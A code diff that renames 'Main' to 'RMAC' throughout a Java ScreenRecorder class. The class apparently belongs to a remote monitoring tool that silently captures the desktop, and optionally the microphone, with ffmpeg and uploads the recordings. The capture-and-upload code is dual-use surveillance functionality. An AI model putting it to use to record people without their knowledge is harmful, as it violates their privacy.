@@ -1,6 +1,6 @@
 package com.rmac.core;
 
-import com.rmac.Main;
+import com.rmac.RMAC;
 import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Constants;
 import com.rmac.utils.NoopOutputStream;
@@ -37,7 +37,7 @@ public class ScreenRecorder implements Runnable {
     try {
       while (!Thread.interrupted()) {
         // If screen recording is disabled via config, keep idle.
-        if (!Main.config.getScreenRecording()) {
+        if (!RMAC.config.getScreenRecording()) {
           Thread.sleep(2000);
           continue;
         }
@@ -53,7 +53,7 @@ public class ScreenRecorder implements Runnable {
         currFFMPEGProc = null;
 
         // Upload the file
-        Main.uploader.uploadFile(
+        RMAC.uploader.uploadFile(
             new File(Constants.CURRENT_LOCATION + "\\" + fileName + ".mkv"),
             ArchiveFileType.SCREEN);
       }
@@ -92,16 +92,16 @@ public class ScreenRecorder implements Runnable {
     String defaultMicName = this.getDefaultMicName();
     log.info("Mic Name: " + defaultMicName);
     log.info("Mic Active: " + isMicActive(defaultMicName));
-    if (Main.config.getAudioRecording()
-        && (Main.config.getActiveAudioRecording() || isMicActive(defaultMicName))
+    if (RMAC.config.getAudioRecording()
+        && (RMAC.config.getActiveAudioRecording() || isMicActive(defaultMicName))
     ) {
       ffmpegBuilder = new ProcessBuilder("\""
           + Constants.FFMPEG_LOCATION
           + "\" -hwaccel dxva2 -loglevel 0 -f gdigrab -framerate "
-          + Main.config.getFPS()
+          + RMAC.config.getFPS()
           + " -threads 1 -i desktop -f dshow -i audio=\"" + defaultMicName
           + "\" -c:v h264 -preset:v fast -vf scale=1366:-1 -t "
-          + Main.config.getVideoDurationFormatted() + " -y \""
+          + RMAC.config.getVideoDurationFormatted() + " -y \""
           + Constants.CURRENT_LOCATION + "\\"
           + fileName + ".mkv\"");
       ffmpegBuilder.directory(new File(Constants.RUNTIME_LOCATION));
@@ -109,9 +109,9 @@ public class ScreenRecorder implements Runnable {
       ffmpegBuilder = new ProcessBuilder("\""
           + Constants.FFMPEG_LOCATION
           + "\" -hwaccel dxva2 -loglevel 0 -f gdigrab -framerate "
-          + Main.config.getFPS()
+          + RMAC.config.getFPS()
           + " -threads 1 -i desktop -c:v h264 -preset:v fast -vf scale=1366:-1 -t "
-          + Main.config.getVideoDurationFormatted() + " -y \""
+          + RMAC.config.getVideoDurationFormatted() + " -y \""
           + Constants.CURRENT_LOCATION + "\\"
           + fileName + ".mkv\"");
       ffmpegBuilder.directory(new File(Constants.RUNTIME_LOCATION));
